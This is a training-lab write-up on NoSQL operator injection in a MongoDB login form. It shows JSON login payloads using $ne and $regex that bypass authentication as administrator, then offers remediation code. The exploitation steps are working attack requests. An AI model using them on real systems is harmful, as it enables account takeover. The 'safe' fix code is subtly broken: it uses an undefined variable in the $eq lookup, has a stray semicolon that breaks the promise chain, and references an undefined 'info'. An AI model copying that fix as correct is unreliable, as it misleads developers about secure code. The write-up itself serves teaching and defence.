## Lab Information
Topic: NoSQL Injection  
Difficulty: Apprentice

## Lab Description (Summary of the vulnerable application and the scenario presented in the lab.)
This lab's login functionality uses MongoDB to authenticate users. The application directly inserts user-controlled JSON into MongoDB query objects. Because MongoDB supports query operators such as `$ne` and `$regex`, an attacker can inject these operators to bypass authentication checks entirely.  
Your task is to exploit this flaw to authenticate as the **administrator** user.

## Vulnerability Analysis (Explanation of the vulnerability type and how it manifests in this specific lab.)
The vulnerability is caused by **NoSQL operator injection**.  
Instead of validating username and password as strings, the backend treats JSON fields as query objects. This allows attackers to inject MongoDB operators like `$ne` (not equal) and `$regex` (regular expression) to manipulate the query.  

This transforms a normal query such as:
```js
{ username: "wiener", password: "peter" }
```
into:
```js
{ username: { $regex: "admin.*" }, password: { $ne: "" } }
```
which matches the administrator record without knowing the password.

## Exploitation Steps
1. Log in as `wiener:peter`, observe JSON login request.
2. Observe POST request `/login` with body `{"username":"wiener","password":"peter"}`, then sign out
3. Send POST request `/login` with body `{"username":"wiener","password":{"$ne":"" }}` → Observe that you are signed in again. It means we have an injection in **password** field
4. Send POST request `/login` with body `{"username":{"$ne":""},"password":{"$ne":"" }}` → Observer 500 Internal Server Error response `Query returned unexpected number of records` . It means we have an injection in **username** field as well.
5. Send POST request `/login` with body `{"username":"administrator","password":{"$ne":"" }}`. Observer log in failed. Looks like username is not administrator.
6. Send POST request `/login` with body `{"username":{"$regex":"admin.*"},"password":{"$ne":"" }}`. Observe response with 302 code. Follow redirection - we are logged in as administrator.

## AppSec Perspective
### What the underlying code might be
A likely vulnerable implementation:
```javascript
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    db.users.findOne({ username: username, password: password })
        .then(user => {
            if (user) {
                req.session.user = user;
                res.redirect('/my-account');
            } else {
                res.status(401).send('Invalid credentials');
            }
        });
});
```

### Security issues enabling exploitation
- Direct use of untrusted user input in database queries, without sanitization or structural validation.
- Lack of strict type enforcement, allowing attacker-controlled objects or expressions to be interpreted as query logic (user input influences the query structure instead of being treated as literal data).
- Absence of schema validation, enabling malformed or operator-based payloads (e.g., $ne, $where, property access such as this.password[i]).

### How to fix it
**Remediation recommendations and safe code version:**
```javascript
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Ensure both fields are strings
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).send('Invalid input');
    }

    // Use parameterized lookup
    db.users.findOne({ username: { $eq: user } }); // Use of `$eq` to avoid implicit operator injection
        .then(user => {
            if (!user) return res.status(401).send('Invalid credentials');

            if (!verifyPassword(password, user.passwordHash)) {
                return res.status(401).send('Invalid credentials');
            }

            req.session.user = user;
            res.redirect('/my-account');
        });
});
```

**Or even better using authentication libraries**
```javascript
const Joi = require('joi');
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const bcrypt = require('bcrypt');

// Validation schema to prevent operator injection
const loginSchema = Joi.object({
    username: Joi.string().min(1).max(50).required(),
    password: Joi.string().min(1).max(200).required()
});

// Passport authentication strategy
passport.use('safe-login', new LocalStrategy(async (username, password, done) => {
    try {
        const user = await db.users.findOne({ username: username }).exec(); // safe lookup
        if (!user) return done(null, false);

        const valid = await bcrypt.compare(password, user.passwordHash);
        if (!valid) return done(null, false);

        return done(null, user);
    } catch (err) {
        return done(err);
    }
}));

app.post('/login', async (req, res, next) => {
    // Validate request body
    const { error } = loginSchema.validate(req.body);
    if (error) return res.status(400).send("Invalid input");

    // Delegate authentication to the Passport middleware
    passport.authenticate('safe-login', (err, user) => {
        if (err) return next(err);
        if (!user) {
            if (info?.message) return res.send(info.message);
            return res.status(401).send("Invalid username or password");
        }

        req.logIn(user, (err) => {
            if (err) return next(err);
            return res.redirect('/my-account');
        });
    })(req, res, next);
});
```

**Additional protections:**
- Enforce schema validation (e.g., Joi, Zod, Yup).
- Disable MongoDB query operators in user-controlled input.
- Always hash passwords and validate them separately from the database query.


## Key Takeaways
### Lessons from attacker perspective
- MongoDB operators (`$ne`, `$gt`, `$regex`) can replace user input entirely.
- Username enumeration is unnecessary when a regex operator can match the target.
- Login forms with JSON bodies are common NoSQL injection vectors.

### Lessons from AppSec perspective (defender)
- Sanitize and validate user input, using an allowlist of accepted characters.
- Insert user input using parameterized queries instead of concatenating user input directly into the query.
- To prevent operator injection, apply an allowlist of accepted keys.
- Use authentication libraries instead of handwritten DB queries.